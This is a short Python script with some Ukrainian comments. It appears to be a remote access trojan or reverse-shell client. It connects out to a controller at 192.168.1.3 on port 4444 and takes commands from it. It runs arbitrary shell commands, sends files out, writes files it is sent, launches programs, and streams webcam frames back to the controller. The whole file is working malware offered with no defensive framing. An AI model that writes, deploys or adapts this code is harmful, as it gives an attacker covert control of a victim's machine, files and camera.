import socket
import subprocess
import os
import time
import cv2
import pickle
import struct

ip_add = "192.168.1.3"
PORT = 4444

def VideoShare():
    data = b''
    i = 0
    cap = cv2.VideoCapture(0)

   

    while (i <= 150):
        ret, frame = cap.read()  # Читання кадру з камери
        if not ret:
            break
        data = pickle.dumps(frame)  # Серіалізація кадру
        message = struct.pack("Q", len(data)) + data  # Упаковка розміру кадру та самого кадру
        connection.sendall(message)
        
        i += 1
    
    connection.sendall("[200]".encode())
    cap.release()

def upload_file(filename):
    time.sleep(3)
    
    f = open(filename, "rb")
    connection.settimeout(25)
    while True:
        file_data = f.read(1024)
        if (not file_data):
            break
        connection.send(file_data) 
    f.close()
    connection.settimeout(None)

def download_file(filename):

    f = open(filename, 'wb')
    connection.settimeout(25)
    
    
    chunk = connection.recv(1024)
    while chunk:
        try:
            f.write(chunk)
        except:
            f.write(chunk.encode())
        try:
            chunk = connection.recv(1024)
        except:
            break
    connection.settimeout(None)
    f.close()
def start_file(path):
    os.startfile(path)

def execute_system_command(command):
    if ('cd ' == command[:3]):
        os.chdir(command[3:])
        output = ""
        errors = ""
    elif('download' == command[:8]):
        upload_file(command[9:])
        return
    elif('upload' == command[:6]):
        download_file(command[7:])
        output = ""
        errors = ""
    elif('startfile' == command[:9]):
        start_file(command[10:])
        output = ""
        errors = ""
    elif('screenshare' == command[:11]):
        VideoShare()
        output=""
        errors=""
    else:
        ret = subprocess.Popen(command, shell=True,text= True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, errors = ret.communicate()
       
    return returnData(output, errors)

def returnData(output, errors):
    if (output == ''):
        output = output + "[*] Command succsesful ended"
    if(errors):

        errors = errors + "[200]"
        return errors
    output = output + "[200]"
    return output


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((ip_add, PORT))

while True:
    command= connection.recv(1024).decode()
    if(command == 'exit'):
        connCloseString = "[-] Connection closed by " + ip_add + " with port " + str(PORT) + "[200]"
        connection.sendall(connCloseString.encode())
        connection.close()
        break
    try:
        connection.sendall(execute_system_command(command).encode())
    except:
        #   connection.sendall(.encode('utf-8'))
        pass
